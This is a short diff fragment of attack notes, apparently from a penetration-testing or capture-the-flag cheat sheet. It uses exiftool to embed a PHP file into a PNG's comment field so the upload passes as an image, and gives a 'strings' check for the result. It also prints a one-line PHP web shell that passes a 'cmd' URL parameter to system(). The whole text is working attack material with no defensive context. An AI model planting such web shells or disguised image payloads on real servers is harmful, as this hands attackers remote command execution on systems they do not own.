@@ -1,0 +1,7 @@
+exiftool "-comment<=shell.php" malicious.png
+
+
+:: Testing ::
+
+- strings webshell.png |grep system
+      - <?php $cmd=$_GET ['cmd']; system ($cmd); ?>
